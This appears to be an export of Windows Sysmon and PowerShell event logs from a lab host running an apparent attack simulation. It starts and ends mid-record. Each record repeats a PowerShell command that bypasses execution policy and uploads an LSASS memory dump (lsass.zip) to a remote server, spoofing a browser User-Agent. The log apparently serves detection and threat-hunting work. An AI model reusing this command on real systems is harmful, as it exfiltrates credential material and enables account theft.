ParentUser: VAGRANT\vagrant",-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,"C:\Program Files\Git\cmd\git.exe, --version",2,"""C:\Program Files\Git\cmd\git.exe"" --version",{7a53022b-4567-6352-c401-000000000b00},C:\Program Files\Git\cmd\git.exe,602f5931006b9aa2bdd04d43cfc3ec39,621e3677d88c56bd0797a48d6beae682b8255027,6c4dbb77d05ca5c482ce3782255f56bb904445809f1df3b655e2505eac7fa0b2,git.exe,"powershell.exe, -ExecutionPolicy, Bypass, -C, $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); ",5,"powershell.exe -ExecutionPolicy Bypass -C ""$ErrorActionPreference = 'Stop'; $fieldName = \""lsass.zip\""; $filePath = \""C:\Users\Public\lsass.zip\""; $url = \""http://192.168.33.12:8888/file/upload\"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(\""X-Request-Id\"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(\""User-Agent\"",\""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); """,{7a53022b-4566-6352-c301-000000000b00},C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe,"7,036",The Git Development Community,Git for Windows,-,b5c28ab8b10670f75eb53affc23558e6,git.exe,Git,"6,464",-,-,C:\Users\vagrant\Downloads\elastic-agent-7.17.6-windows-x86_64\,-,-,-,-,-,-,"6c4dbb77d05ca5c482ce3782255f56bb904445809f1df3b655e2505eac7fa0b2, 621e3677d88c56bd0797a48d6beae682b8255027, 602f5931006b9aa2bdd04d43cfc3ec39, b5c28ab8b10670f75eb53affc23558e6",vagrant,"technique_id=T1059.001,technique_name=PowerShell",-,-,-,VAGRANT,S-1-5-18,vagrant,-,wineventlog,Microsoft-Windows-Sysmon/Operational,vagrant,-,The Git Development Community,-,Git for Windows,-,-,-,High,{7a53022b-2aa0-6352-661a-050000000000},0x51a66,VAGRANT\vagrant,Git,-,-,-,-,-,-,-,-,1,1,-,Info,"2,716","3,916",{5770385f-c22a-43e0-bf4c-06f5698ffbd9},Microsoft-Windows-Sysmon,6526,Process Create (rule: ProcessCreate),NT AUTHORITY,S-1-5-18,SYSTEM,User,5
"Oct 21, 2022 @ 03:08:23.665",-,ecd05dc1-8bd4-4b91-af72-a43af352c71e,vagrant,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,vagrant,filebeat,7.17.6,windows.powershell,default,logs,8.0.0,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,false,7.17.6,Engine Lifecycle,verified,process,400,"Oct 21, 2022 @ 03:08:24.050",windows.powershell,"Oct 21, 2022 @ 03:08:48.000",event,windows,PowerShell,13,start,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,x86_64,vagrant,7a53022b-14a5-4000-983d-b77eea66f342,"fe80::5069:29a8:d50:ec, 10.0.2.15, fe80::55ef:63f:8ff2:2526, 192.168.33.11, fe80::19f3:c4e1:10ab:4603, 172.26.128.1","08:00:27:7a:a2:fc, 08:00:27:cf:63:d3, 00:15:5d:95:9d:54",vagrant,17763.1935,windows,10.0.17763.1935 (WinBuild.160101.0800),Windows Server 2019 Datacenter Evaluation,Windows Server 2019 Datacenter Evaluation,windows,windows,10.0,winlog,-,information,-,-,-,-,"Engine state is changed from None to Available. 

Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.17763.1852
	HostId=41289939-8716-49c9-9f2c-1b307dfe45d7
	HostApplication=powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); 
	EngineVersion=5.1.17763.1852
	RunspaceId=bde48661-68d6-4497-8031-ceecb4afd9c6
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,Available,None,5.1.17763.1852,-,-,-,-,5.1.17763.1852,-,-,bde48661-68d6-4497-8031-ceecb4afd9c6,-,-,"powershell.exe, -ExecutionPolicy, Bypass, -C, $ErrorActionPreference, =, 'Stop';, $fieldName, =, lsass.zip;, $filePath, =, C:\Users\Public\lsass.zip;, $url, =, http://192.168.33.12:8888/file/upload;, Add-Type, -AssemblyName, 'System.Net.Http';, $client, =, New-Object, System.Net.Http.HttpClient;, $content, =, New-Object, System.Net.Http.MultipartFormDataContent;, $fileStream, =, [System.IO.File]::OpenRead($filePath);, $fileName, =, [System.IO.Path]::GetFileName($filePath);, $fileContent, =, New-Object, System.Net.Http.StreamContent($fileStream);, $content.Add($fileContent,, $fieldName,, $fileName);, $client.DefaultRequestHeaders.Add(X-Request-Id,, $env:COMPUTERNAME, +, '-mykdsa');, $client.DefaultRequestHeaders.Add(User-Agent,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36);, $result, =, $client.PostAsync($url,, $content).Result;, $result.EnsureSuccessStatusCode();",50,"powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); ",41289939-8716-49c9-9f2c-1b307dfe45d7,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,vagrant,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,400,Classic,Info,-,-,-,PowerShell,1550,Engine Lifecycle,-,-,-,-,-
"Oct 21, 2022 @ 03:08:23.638",-,ecd05dc1-8bd4-4b91-af72-a43af352c71e,vagrant,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,vagrant,filebeat,7.17.6,windows.powershell,default,logs,8.0.0,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,false,7.17.6,Provider Lifecycle,verified,process,600,"Oct 21, 2022 @ 03:08:24.050",windows.powershell,"Oct 21, 2022 @ 03:08:48.000",event,windows,PowerShell,1,info,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,x86_64,vagrant,7a53022b-14a5-4000-983d-b77eea66f342,"fe80::5069:29a8:d50:ec, 10.0.2.15, fe80::55ef:63f:8ff2:2526, 192.168.33.11, fe80::19f3:c4e1:10ab:4603, 172.26.128.1","08:00:27:7a:a2:fc, 08:00:27:cf:63:d3, 00:15:5d:95:9d:54",vagrant,17763.1935,windows,10.0.17763.1935 (WinBuild.160101.0800),Windows Server 2019 Datacenter Evaluation,Windows Server 2019 Datacenter Evaluation,windows,windows,10.0,winlog,-,information,-,-,-,-,"Provider ""Registry"" is Started. 

Details: 
	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.17763.1852
	HostId=41289939-8716-49c9-9f2c-1b307dfe45d7
	HostApplication=powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); 
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,5.1.17763.1852,Registry,Started,-,-,-,"powershell.exe, -ExecutionPolicy, Bypass, -C, $ErrorActionPreference, =, 'Stop';, $fieldName, =, lsass.zip;, $filePath, =, C:\Users\Public\lsass.zip;, $url, =, http://192.168.33.12:8888/file/upload;, Add-Type, -AssemblyName, 'System.Net.Http';, $client, =, New-Object, System.Net.Http.HttpClient;, $content, =, New-Object, System.Net.Http.MultipartFormDataContent;, $fileStream, =, [System.IO.File]::OpenRead($filePath);, $fileName, =, [System.IO.Path]::GetFileName($filePath);, $fileContent, =, New-Object, System.Net.Http.StreamContent($fileStream);, $content.Add($fileContent,, $fieldName,, $fileName);, $client.DefaultRequestHeaders.Add(X-Request-Id,, $env:COMPUTERNAME, +, '-mykdsa');, $client.DefaultRequestHeaders.Add(User-Agent,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36);, $result, =, $client.PostAsync($url,, $content).Result;, $result.EnsureSuccessStatusCode();",50,"powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); ",41289939-8716-49c9-9f2c-1b307dfe45d7,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,vagrant,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,Info,-,-,-,PowerShell,1544,Provider Lifecycle,-,-,-,-,-
"Oct 21, 2022 @ 03:08:23.638",-,ecd05dc1-8bd4-4b91-af72-a43af352c71e,vagrant,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,vagrant,filebeat,7.17.6,windows.powershell,default,logs,8.0.0,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,false,7.17.6,Provider Lifecycle,verified,process,600,"Oct 21, 2022 @ 03:08:24.050",windows.powershell,"Oct 21, 2022 @ 03:08:48.000",event,windows,PowerShell,3,info,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,x86_64,vagrant,7a53022b-14a5-4000-983d-b77eea66f342,"fe80::5069:29a8:d50:ec, 10.0.2.15, fe80::55ef:63f:8ff2:2526, 192.168.33.11, fe80::19f3:c4e1:10ab:4603, 172.26.128.1","08:00:27:7a:a2:fc, 08:00:27:cf:63:d3, 00:15:5d:95:9d:54",vagrant,17763.1935,windows,10.0.17763.1935 (WinBuild.160101.0800),Windows Server 2019 Datacenter Evaluation,Windows Server 2019 Datacenter Evaluation,windows,windows,10.0,winlog,-,information,-,-,-,-,"Provider ""Alias"" is Started. 

Details: 
	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.17763.1852
	HostId=41289939-8716-49c9-9f2c-1b307dfe45d7
	HostApplication=powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); 
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,5.1.17763.1852,Alias,Started,-,-,-,"powershell.exe, -ExecutionPolicy, Bypass, -C, $ErrorActionPreference, =, 'Stop';, $fieldName, =, lsass.zip;, $filePath, =, C:\Users\Public\lsass.zip;, $url, =, http://192.168.33.12:8888/file/upload;, Add-Type, -AssemblyName, 'System.Net.Http';, $client, =, New-Object, System.Net.Http.HttpClient;, $content, =, New-Object, System.Net.Http.MultipartFormDataContent;, $fileStream, =, [System.IO.File]::OpenRead($filePath);, $fileName, =, [System.IO.Path]::GetFileName($filePath);, $fileContent, =, New-Object, System.Net.Http.StreamContent($fileStream);, $content.Add($fileContent,, $fieldName,, $fileName);, $client.DefaultRequestHeaders.Add(X-Request-Id,, $env:COMPUTERNAME, +, '-mykdsa');, $client.DefaultRequestHeaders.Add(User-Agent,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36);, $result, =, $client.PostAsync($url,, $content).Result;, $result.EnsureSuccessStatusCode();",50,"powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); ",41289939-8716-49c9-9f2c-1b307dfe45d7,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,ConsoleHost,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,wineventlog,Windows PowerShell,vagrant,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,600,Classic,Info,-,-,-,PowerShell,1545,Provider Lifecycle,-,-,-,-,-
"Oct 21, 2022 @ 03:08:23.638",-,ecd05dc1-8bd4-4b91-af72-a43af352c71e,vagrant,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,vagrant,filebeat,7.17.6,windows.powershell,default,logs,8.0.0,1f43b7cd-e3a6-47bc-af9a-4fe0ad565949,false,7.17.6,Provider Lifecycle,verified,process,600,"Oct 21, 2022 @ 03:08:24.050",windows.powershell,"Oct 21, 2022 @ 03:08:48.000",event,windows,PowerShell,5,info,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,-,x86_64,vagrant,7a53022b-14a5-4000-983d-b77eea66f342,"fe80::5069:29a8:d50:ec, 10.0.2.15, fe80::55ef:63f:8ff2:2526, 192.168.33.11, fe80::19f3:c4e1:10ab:4603, 172.26.128.1","08:00:27:7a:a2:fc, 08:00:27:cf:63:d3, 00:15:5d:95:9d:54",vagrant,17763.1935,windows,10.0.17763.1935 (WinBuild.160101.0800),Windows Server 2019 Datacenter Evaluation,Windows Server 2019 Datacenter Evaluation,windows,windows,10.0,winlog,-,information,-,-,-,-,"Provider ""Environment"" is Started. 

Details: 
	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.17763.1852
	HostId=41289939-8716-49c9-9f2c-1b307dfe45d7
	HostApplication=powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'Stop'; $fieldName = ""lsass.zip""; $filePath = ""C:\Users\Public\lsass.zip""; $url = ""http://192.168.33.12:8888/file/upload"";  Add-Type -AssemblyName 'System.Net.Http';  $client = New-Object System.Net.Http.HttpClient; $content = New-Object System.Net.Http.MultipartFormDataContent; $fileStream = [System.IO.File]::OpenRead($filePath); $fileName = [System.IO.Path]::GetFileName($filePath); $fileContent = New-Object System.Net.Http.StreamContent($fileStream); $content.Add($fileContent, $fieldName, $fileName); $client.DefaultRequestHeaders.Add(""X-Request-Id"", $env:COMPUTERNAME + '-mykdsa'); $client.DefaultRequestHeaders.Add(""User-Agent"",""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"");  $result = $client.PostAsync($url, $content).Result; $result.EnsureSuccessStatusCode(); 
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
